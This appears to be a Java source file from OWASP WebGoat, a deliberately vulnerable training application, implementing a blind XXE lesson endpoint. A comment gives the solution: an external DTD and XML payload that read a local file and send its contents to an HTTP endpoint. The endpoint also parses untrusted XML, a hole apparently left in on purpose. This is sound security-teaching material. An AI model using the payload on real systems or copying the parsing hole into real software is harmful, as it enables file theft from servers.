package org.owasp.webgoat.plugin;

import org.apache.commons.lang.exception.ExceptionUtils;
import org.owasp.webgoat.lessons.Assignment;
import org.owasp.webgoat.lessons.model.AttackResult;
import org.springframework.http.MediaType;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.ResponseBody;

import java.io.File;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.List;

import static org.owasp.webgoat.plugin.SimpleXXE.parseXml;

/**
 * ************************************************************************************************
 * This file is part of WebGoat, an Open Web Application Security Project utility. For details,
 * please see http://www.owasp.org/
 * <p>
 * Copyright (c) 2002 - 20014 Bruce Mayhew
 * <p>
 * This program is free software; you can redistribute it and/or modify it under the terms of the
 * GNU General Public License as published by the Free Software Foundation; either version 2 of the
 * License, or (at your option) any later version.
 * <p>
 * This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without
 * even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
 * General Public License for more details.
 * <p>
 * You should have received a copy of the GNU General Public License along with this program; if
 * not, write to the Free Software Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA
 * 02111-1307, USA.
 * <p>
 * Getting Source ==============
 * <p>
 * Source for this application is maintained at https://github.com/WebGoat/WebGoat, a repository for free software
 * projects.
 * <p>
 *
 * @author nbaars
 * @version $Id: $Id
 * @since November 18, 2016
 */
public class BlindSendFileAssignment extends Assignment {

    @Override
    public String getPath() {
        return "XXE/blind";
    }

    @RequestMapping(method = RequestMethod.POST, consumes = MediaType.ALL_VALUE, produces = MediaType.APPLICATION_JSON_VALUE)
    @ResponseBody
    public AttackResult createNewUser(@RequestBody String userInfo) throws Exception {
        String error = "";
        try {
            parseXml(userInfo);
        } catch (Exception e) {
            error = ExceptionUtils.getFullStackTrace(e);
        }

        File logFile = new File(getPluginDirectory(), "plugin/XXE/");
        List<String> lines = Files.readAllLines(Paths.get(logFile.toURI()));
        boolean solved = lines.stream().filter(l -> l.contains("WebGoat 8 rocks...")).findFirst().isPresent();
        if (solved) {
            return AttackResult.success();
        } else {
            return AttackResult.failed("Try again...", error);
        }
    }

    /**
     * Solution:
     *
     * Create DTD:
     *
     * <pre>
     *     <?xml version="1.0" encoding="UTF-8"?>
     *     <!ENTITY % file SYSTEM "file:///c:/windows-version.txt">
     *     <!ENTITY % all "<!ENTITY send SYSTEM 'http://localhost:8080/WebGoat/XXE/ping?text=%file;'>">
     *      %all;
     * </pre>
     *
     * This will be reduced to:
     *
     * <pre>
     *     <!ENTITY send SYSTEM 'http://localhost:8080/WebGoat/XXE/ping?text=[contents_file]'>
     * </pre>
     *
     * Wire it all up in the xml send to the server:
     *
     * <pre>
     *  <?xml version="1.0"?>
     *  <!DOCTYPE root [
     *  <!ENTITY % remote SYSTEM "http://localhost:8080/WebGoat/plugin_lessons/plugin/XXE/test.dtd">
     *  %remote;
     *   ]>
     *  <user>
     *    <username>test&send;</username>
     *  </user>
     *
     * </pre>
     *
     */
}
